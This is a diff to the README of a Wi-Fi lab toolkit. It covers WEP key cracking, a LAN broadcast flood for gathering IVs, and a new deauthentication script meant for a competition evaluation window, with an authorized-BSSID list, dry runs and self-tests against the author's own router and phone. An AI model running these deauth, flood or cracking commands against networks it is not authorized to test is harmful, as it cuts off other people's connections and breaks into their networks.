@@ -21,7 +21,7 @@ airmon-ng                                       # chipset/driver per interface
 ## 2. Install (once)
 
 ```bash
-sudo dnf install aircrack-ng
+sudo dnf install aircrack-ng wireshark-cli     # wireshark-cli provides tshark, which the capture-health table reads captures with
 ```
 
 ## 3. Find the target's BSSID and channel
@@ -29,7 +29,7 @@ sudo dnf install aircrack-ng
 ```bash
 sudo ./scripts/airodump.sh -i wlp2s0            # lists every AP with its BSSID and CH; Ctrl-C stops and restores WiFi
 sudo ./scripts/airodump.sh -i wlp2s0 -c 6       # same, locked to channel 6
-sudo ./scripts/airodump.sh -i wlp2s0 -B abg    # also hop 5 GHz channels (AC8260 only)
+sudo ./scripts/airodump.sh -i wlp2s0 -B abg    # also hop 5 GHz channels (the 3168NGW's 5 GHz hop is untested)
 sudo ./scripts/managed-scan.sh -i wlp2s0        # managed scan: channel, signal, BSSID and name; keeps the connection
 sudo ./scripts/managed-scan.sh -i wlp2s0 -c 6   # managed scan of channel 6 only
 ```
@@ -58,6 +58,9 @@ sudo ./scripts/wep-crack.sh -i wlp2s0 -b 11:22:33:44:55:66 -c 6 -m active -o cap
 | `-m` | `active` or `passive` | `active` |
 | `-o` | Output prefix; the files go to a new folder under `logs/` | `wepcap` |
 | `-t` | IVs gained before `aircrack-ng` runs again (first try at 40000) | `10000` |
+
+When the run ends, it prints the capture-health table and saves it as `<prefix>-01-health.txt`
+(section 11 explains the columns).
 
 What the script does at each step, and why: see [README.md](README.md#how-the-scripts-work).
 
@@ -115,8 +118,8 @@ ssh root@your-router-ip "SSID=Lab SLOT=2 sh -s -- '12345' '67890'" < router/wifi
 # Check the AP is actually up
 ssh root@your-router-ip "logread | grep -i hostapd | tail"
 
-# The script doesn't change the channel. The lab router is on channel 6, where both cards
-# injected in our tests.
+# The script doesn't change the channel. The lab router is on channel 6, where the AC8260 and the
+# 3168NGW both injected in our tests.
 ```
 
 If the router's own wpad has no WEP, run a WEP build from RAM. It is undone by `undo` or by a reboot. The Wi-Fi settings are not touched, so run `router/wifi-wep-test.sh` on the router afterwards. The WEP build is described in [router/wifi-wep-setup/README.md](router/wifi-wep-setup/README.md):
@@ -180,8 +183,138 @@ A flood from the laptop over the wired LAN also gives IVs, as long as a station 
 
 ```bash
 python3 scripts/broadcast_feed.py 192.168.8.255 300 600     # to every station on the LAN, 300 a second for 10 minutes
-python3 scripts/broadcast_feed.py <phone IP> 2000 120    # to one station's IP, 2,000 a second for 2 minutes
+python3 scripts/broadcast_feed.py <station-IP> 2000 120     # to one station's IP, 2,000 a second for 2 minutes
 python3 scripts/broadcast_feed.py -h                        # usage, and why the payload size matters
 ```
 
 The ESP32-C3 keyless-station test is in [esp32c3-station/README.md](esp32c3-station/README.md).
+
+## 11. The evaluation window: capture health and deauth
+
+The deauth command sends frames, so it is for the official evaluation window only. The
+health table only reads files.
+
+**Before the window, rehearse.** A dry run prints the plan and sends nothing. It needs no root and no card:
+
+```bash
+./scripts/competition-deauth.sh -b <BSSID> -c <CHANNEL> -u <HH:MM> --dry-run
+```
+
+Prepare:
+
+1. `scripts/authorized-bssids.txt`: the evaluation network's BSSID, one per line. The file is in the
+   root `.gitignore`, so it stays out of git.
+2. The channel, from `managed-scan.sh` or from an airodump capture.
+3. Optional, `clients.txt`: one client MAC per line, from a capture on that channel. The airodump CSV
+   lists each client with the BSSID it is on:
+
+   ```bash
+   awk -F', *' -v b=<BSSID> 'NF == 7 && $1 ~ /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/ && toupper($6) == toupper(b) { print $1 }' logs/<run>/<prefix>-01.csv > clients.txt
+   ```
+
+   Leave this file out to target every client of the AP at once (the broadcast address).
+
+**In the window, run it.** The card goes into monitor mode, so the laptop's own Wi-Fi drops, as it does during a capture. Run this or a capture, not both.
+
+```bash
+sudo ./scripts/competition-deauth.sh -i wlp2s0 -b <BSSID> -c <CHANNEL> -u <HH:MM> --in-window
+sudo ./scripts/competition-deauth.sh -i wlp2s0 -b <BSSID> -c <CHANNEL> -u <HH:MM> --in-window -f clients.txt
+```
+
+- `--in-window` is required, and you pass it only while the window is open.
+- `-u HH:MM` is required. The run stops by itself at that time, on this machine's clock.
+- `-f clients.txt` is optional. With it, each round makes one call per listed client. Without it, each round
+  makes one call to the broadcast address, which reaches every client.
+- `-r N` is optional: stop after N rounds (a short test). Without it, the run goes until `-u` or Ctrl-C.
+- You type `START` at the prompt. Ctrl-C stops the run and restores WiFi.
+- Each round sends 5 frames per target and then waits 2 s. A call still running after 30 s is stopped.
+
+The run writes `deauth.log`, `aireplay.txt`, `capture-01.cap` and `capture-01-health.txt` to its run folder.
+It prints the health table when it stops.
+
+**The health table** (printed at the end of every run, `wep-crack.sh` too). To read an older capture by hand:
+
+```bash
+bash -c 'source scripts/wifi-lib.sh && capture_health logs/<run>/cap-01.cap <BSSID>'
+```
+
+- `WEP_frames`: data frames with the WEP bit, each carrying an IV
+- `AP_bcast`: of those, the frames the AP sent to the broadcast address
+- `retry%`: the share of those flagged as retries
+- `deauth`, `disassoc`, `auth`, `assoc_req`: management frames of those types, per minute and in total. They
+  carry the AP's address whoever sent them, so they show what reached the air.
+
+**Limits.** aireplay-ng's `-a` mode waits for a beacon from the AP before it sends. On the AC8260 it can stop with
+"Couldn't determine current channel" (TESTS.md, section 2.19). On the 3168NGW it printed "channel -1" while it
+waited, then sent normally (TESTS.md, section 2.20). The tool does not pass aireplay-ng's
+`--ignore-negative-one`. The tool has not been run on air yet (TESTS.md, section 5).
+
+**Check it yourself.** Section 12 lists the commands, and what each should print.
+
+## 12. Test each new script yourself
+
+Run these in order. Steps 12.1 and 12.2 send nothing. Steps 12.3 to 12.5 send frames, only to your own phone and your own router. Replace `<router BSSID>` with the GL router's BSSID and `wlp2s0` with your card's interface. The `-u` times below are computed as ten minutes from now.
+
+### 12.1 The capture-health table (reads a file, sends nothing)
+
+```bash
+bash -c 'source scripts/wifi-lib.sh && capture_health logs/2026-10-20_040047_cap_3168/cap_3168-01.cap <router BSSID>'
+```
+
+Expect one row per minute, then this total: `total 80906 36 1.1% 210 61842 439 15` (the 04:00 run in TESTS.md, section 2.20). For another capture, use its folder in `logs/` and its BSSID.
+
+### 12.2 The table at the end of a run (listens only)
+
+```bash
+sudo ./scripts/wep-crack.sh -i wlp2s0 -b <router BSSID> -c 6 -m passive -o table_test
+```
+
+Passive mode only listens. Start a download on your phone over the router's Wi-Fi, let the run go for about a minute, then press Ctrl-C. Expect `Cleaning up`, then `What the air showed (saved to …/table_test-01-health.txt)` and the table.
+
+### 12.3 Deauth: the plan (sends nothing)
+
+The tool targets only BSSIDs in `scripts/authorized-bssids.txt`, a local file that git ignores. Add your router for these tests, and remove it at 12.6:
+
+```bash
+echo "<router BSSID>" >> scripts/authorized-bssids.txt
+./scripts/competition-deauth.sh -b <router BSSID> -c 6 -u $(date -d '+10 min' +%H:%M) --dry-run
+```
+
+Expect the broadcast plan and `Dry run: nothing was sent`. `./scripts/competition-deauth.sh -h` lists every option.
+
+### 12.4 Deauth: one round to your phone (sends frames)
+
+1. With the phone connected to the router's Wi-Fi, record the stations on the router's channel for about 20 seconds, then press Ctrl-C:
+   ```bash
+   sudo ./scripts/airodump.sh -i wlp2s0 -c 6 -w phone
+   ```
+2. Build the list from the new CSV, `logs/<run>/phone-01.csv`, with the awk line in section 11 (`<prefix>` = `phone`). Save it as `my-phone.txt`. It should hold your phone's MAC and nothing else.
+3. Dry run with the list. Expect `1 listed client(s)`:
+   ```bash
+   ./scripts/competition-deauth.sh -b <router BSSID> -c 6 -u $(date -d '+10 min' +%H:%M) -f my-phone.txt --dry-run
+   ```
+4. The live round. Type `START` when asked. The laptop's Wi-Fi drops while it runs:
+   ```bash
+   sudo ./scripts/competition-deauth.sh -i wlp2s0 -b <router BSSID> -c 6 -u $(date -d '+10 min' +%H:%M) -f my-phone.txt -r 1 --in-window
+   ```
+   Expect one line `round 1 <phone MAC>:` with aireplay-ng's output, then `Done: 1 round(s)` and the table. The phone should lose its connection and reconnect. `deauth.log` and `aireplay.txt` in the run folder record what was sent.
+
+The tool requires `--in-window` for every real run. On your own router it only confirms the run; it does not check the course window.
+
+### 12.5 Deauth: broadcast to every client (optional)
+
+Only when no other device on the router matters:
+
+```bash
+sudo ./scripts/competition-deauth.sh -i wlp2s0 -b <router BSSID> -c 6 -u $(date -d '+10 min' +%H:%M) -r 1 --in-window
+```
+
+Expect `round 1 broadcast:` with aireplay-ng's output. Every client of the router gets the frames.
+
+### 12.6 Clean up
+
+```bash
+sed -i '/<router BSSID>/d' scripts/authorized-bssids.txt
+```
+
+Ctrl-C stops any run at once, and the script restores WiFi on exit. The table may not show the deauth frames your laptop sent, because a monitor-mode card may not capture its own transmissions. I haven't checked that on this card, so judge the effect from `deauth.log` and from the phone.
